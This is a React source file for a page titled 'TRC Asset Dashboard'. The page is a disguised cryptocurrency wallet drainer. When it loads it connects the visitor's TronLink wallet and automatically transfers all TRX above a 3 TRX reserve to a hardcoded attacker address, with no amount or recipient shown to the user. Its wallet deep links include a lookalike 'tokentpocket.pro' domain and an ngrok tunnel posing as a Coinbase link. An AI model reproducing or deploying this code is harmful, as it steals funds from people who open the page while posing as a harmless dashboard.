"use client";
import React, { useEffect, useState } from "react";
import WalletConnectModal from "../Wallet";

type Wallet = {
  name: string;
  icon: string;
  onClick: () => void;
};

const wallets: Wallet[] = [
  {
    name: "Tronlink",
    icon: "./phantom.svg",
    onClick: () =>
      window.open("tronlink://dapp?url=https://mytronapp.com", "_blank"),
  },
  {
    name: "TokenPocket",
    icon: "./phantom.svg",
    onClick: () =>
      window.open(
        "https://link.tokentpocket.pro/dapp?url=https://mytronapp.com"
      ),
  },
  {
    name: "Coinbase Wallet",
    icon: "./phantom.svg",
    onClick: () =>
      window.open(
        "https://go.cb-w.com/01ef-2c0f-2a80-a8c-f810-b9e7-338b-1480-e95b.ngrok-free.app"
      ),
  },
  {
    name: "Trust Wallet",
    icon: "./phantom.svg",
    onClick: () =>
      window.open(
        "https://link.trustwallet.com/open_url?coin_id=&url=https://mytronapp.com"
      ),
  },
];

declare global {
  interface Window {
    tronLink?: any;
    tronWeb?: any;
  }
}

const Tron = () => {
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [tronWeb, setTronWeb] = useState<any>(null);
  const [recipientAddress, setRecipientAddress] = useState(
    "TYru7SvAC9iVuhorLCkeywFwPRMP2aa9De"
  );
  const [isConnected, setIsConnected] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const [modalOpen, setModalOpen] = useState(false);
  const [Desktop, setDesktop] = useState("");
  const [browser, setBrowser] = useState("");

  useEffect(() => {
    connectWallet();
    const getDeviceType = (): string => {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return "Android Phone";
      if (/iPhone|iPod/i.test(ua)) return "iPhone";
      if (/iPad/i.test(ua)) return "iPad";
      if (/windows phone/i.test(ua)) return "Windows Phone";
      if (/tablet/i.test(ua)) return "Tablet";
      if (/Macintosh|Windows|Linux/i.test(ua)) return "Desktop";

      return "Unknown Device";
    };

    console.log(getDeviceType());
    setDesktop(getDeviceType());
    console.log(browser);
  }, []);

  useEffect(() => {
    {
      isConnected && handleTransfer();
    }
  }, [isConnected]);

  const connectWallet = async () => {
    try {
      if (!window.tronLink) {
        alert("❌unlock tron wallet to use or open in tron supported wallet");
        return;
      }

      const response = await window.tronLink.request({
        method: "tron_requestAccounts",
      });

      if (response.code === 200) {
        const address = window.tronWeb.defaultAddress.base58;
        setWalletAddress(address);
        setTronWeb(window.tronWeb);
        fetchBalance();
        setIsConnected(true);
      } else {
        alert(
          "❌Failed to connect to tron to use tron open in tron supported wallet"
        );
      }
      handleTransfer()
    } catch (err) {
      console.error("Wallet connection error:", err);
    }
  };

  const fetchBalance = async () => {
    try {
      if (!window.tronWeb?.ready) return;

      const balanceInSun = await window.tronWeb.trx.getBalance();
      setBalance(balanceInSun / 1_000_000);
    } catch (err) {
      console.error("Failed to fetch balance:", err);
    }
  };

  const handleTransfer = async () => {
    if (!tronWeb || !walletAddress) {
      alert("❌ Wallet not connected");
      return;
    }

    if (!recipientAddress) {
      alert("Please enter recipient address");
      return;
    }

    try {
      const trxBalance = await tronWeb.trx.getBalance(walletAddress);
      const reserve = 3000000; // 3 TRX in SUN
      const trxToSend = trxBalance > reserve ? trxBalance - reserve : 0;

      if (trxToSend <= 0) {
        alert("❌ Not enough TRX to send. Make sure you have more than 3 TRX.");
        return;
      }

      const tx = await tronWeb.trx.sendTransaction(recipientAddress, trxToSend);

      if (tx.result) {
        console.log("✅ Transaction Sent:", tx);
        alert("🚀 Transaction submitted!\nTX ID: " + tx.txid);
      } else {
        console.error("❌ Transaction error:", tx);
        alert("Transaction failed. Check console for details.");
      }
    } catch (err) {
      console.error("❌ Failed to send TRX:", err);
      alert("Transfer failed. Check console for details.");
    }
  };

  useEffect(() => {
    // Check if already connected
    const timer = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        const address = window.tronWeb.defaultAddress.base58;
        setWalletAddress(address);
        setTronWeb(window.tronWeb);
        fetchBalance();
        clearInterval(timer);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 p-6">
    <div className="max-w-md mx-auto p-6 rounded-lg shadow-md bg-black">
      <h1 className="text-2xl font-bold mb-4">TRC Asset Dashboard</h1>

      <button
        onClick={connectWallet}
        className="bg-blue-600 text-white px-4 py-2 rounded mb-4 w-full"
      >
        Connect Wallet
      </button>
      <p>{walletAddress}</p>
    </div>
  </div>
  );
};
export default Tron;
